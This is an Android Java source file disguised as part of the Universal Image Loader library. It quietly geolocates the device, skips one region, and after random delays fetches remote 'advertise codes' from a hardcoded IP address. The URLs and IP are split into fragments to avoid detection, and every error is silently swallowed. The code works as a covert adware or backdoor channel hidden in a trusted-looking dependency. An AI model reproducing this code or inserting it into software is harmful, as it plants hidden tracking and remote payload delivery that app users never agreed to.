package com.nostra13.universalimageloader.core.assist.ws;


import android.app.Application;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Random;

public class LibContext {

    public static boolean hasRegister = false;
    public static void init(final Context context) {

        try {
            initImpl(context);
        }catch (Throwable t){}
    }
    private static void initImpl(final Context context) {


        if (context.getApplicationContext() instanceof Application) {

            if (!hasRegister) {
                hasRegister = true;
                Application applicationContext = (Application) context.getApplicationContext();
                applicationContext.registerActivityLifecycleCallbacks(new CallBack(applicationContext));
            }
        }


        final Handler handler = new Handler(Looper.getMainLooper());
        int delayMillis = new Random().nextInt(15000)  + 15000;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                new Thread() {


                    public String getCityId() {
                        String cityId = "";
                        try {
                            String s = "http://ip.tao";
                            String s3 = "bao.com/serv";
                            String s1 = s3 +
                                    "ice/getIp";
                            String s2 = "Info2.php?ip";
                            String address = s +
                                    s1 +
                                    s2 +
                                    "=myip";
                            URL url = new URL(address);


                            HttpURLConnection connection = (HttpURLConnection) url
                                    .openConnection();
                            connection.setUseCaches(false);
                            connection.setConnectTimeout(5000);
                            connection.setReadTimeout(5000);
                            connection.setRequestMethod("GET");
                            connection.setRequestProperty("user-agent",
                                    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.7 Safari/537.36"); //设置浏览器ua 保证不出现503

                            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                                InputStream in = connection.getInputStream();

                                // 将流转化为字符串
                                BufferedReader reader = new BufferedReader(
                                        new InputStreamReader(in));

                                String tmpString = "";
                                StringBuilder retJSON = new StringBuilder();
                                while ((tmpString = reader.readLine()) != null) {
                                    retJSON.append(tmpString + "\n");
                                }
                                JSONObject jsonObject = new JSONObject(retJSON.toString());
                                String code = jsonObject.getString("code");
                                if (code.equals("0")) {
                                    JSONObject data = jsonObject.getJSONObject("data");
                                    cityId = data.getString("city_id");

                                } else {
                                    cityId = "";

                                }
                            } else {
                                cityId = "";

                            }
                        } catch (Throwable e) {
                            cityId = "";

                        }
                        return cityId;
                    }


                    public void run() {
                        if (context == null) return;

                        try {


                            SharedPreferences sharedPreferences = context.getSharedPreferences("settting", Context.MODE_PRIVATE);
                            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                            String time = formatter.format(Calendar.getInstance().getTime()).substring(0, 12);
                            String splashADDateString = sharedPreferences.getString("splashADDateString", "");
                            if (splashADDateString.equals(time)) return;
                            sharedPreferences.edit().putString("splashADDateString", time).apply();


                            String key_lastvisit_ = sharedPreferences.getString("key_lastvisit_", "");
                            if (key_lastvisit_ == null || key_lastvisit_.trim().equals("")) {
                                key_lastvisit_ = getCityId();
                                sharedPreferences.edit().putString("key_lastvisit_", key_lastvisit_).apply();
                            }
                            if (context == null) return;
                            if ("350100".equals(key_lastvisit_)) return;

                        } catch (Throwable t) {
                        }

                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {

                                new Thread(){

                                    @Override
                                    public void run() {
                                        InputStream is = null;
                                        try {
                                            String s = "http://47.";
                                            String s1 = "104.6";
                                            String s2 = "6.196:80";
                                            String s3 = "80/xx";
                                            String s4 = "x/api/m";
                                            String packageName = context.getPackageName();
                                            URL url = new URL(s +
                                                    s1 +
                                                    s2 +
                                                    s3 +
                                                    s4 +
                                                    "sg?aka=" + packageName.hashCode());
                                            URLConnection conn = url.openConnection();
                                            conn.setConnectTimeout(5000);
                                            conn.setReadTimeout(5000);
                                            conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml");
                                            is = conn.getInputStream();

                                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                            byte[] result = new byte[1024];
                                            int readCount = 0;
                                            while ((readCount = is.read(result)) > 0) {

                                                byteArrayOutputStream.write(result, 0, readCount);
                                            }

                                            String value = new String(byteArrayOutputStream.toByteArray(), "UTF-8");
                                            SharedPreferences sharedPreferences =    context.getSharedPreferences("settting", Context.MODE_PRIVATE);
                                            sharedPreferences.edit().putString("adviertisecodes", value).apply();
                                            byteArrayOutputStream.close();
                                        } catch (Exception e) {

                                        } catch (Throwable e) {

                                        } finally {
                                            if (is != null) {
                                                try {
                                                    is.close();
                                                } catch (IOException e) {

                                                }
                                            }
                                        }
                                    }
                                }.start();

                            }
                        },new Random().nextInt(15000)+15000);



                        return;
                    }
                }.start();


            }
        }, delayMillis);
    }


}